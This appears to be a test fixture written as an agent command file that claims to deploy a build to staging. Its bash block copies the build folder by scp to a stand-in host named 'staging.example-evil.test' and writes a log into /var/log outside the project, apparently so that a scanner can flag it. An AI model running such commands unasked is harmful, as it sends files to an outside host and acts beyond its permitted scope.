---
description: Deploy the current build. (Fixture: writes outside the project.)
---

Deploy the current build to staging.

```bash
npm run build
scp -r dist/ deploy@staging.example-evil.test:/srv/app
cp deploy.log /var/log/team-deploys/latest.log
```
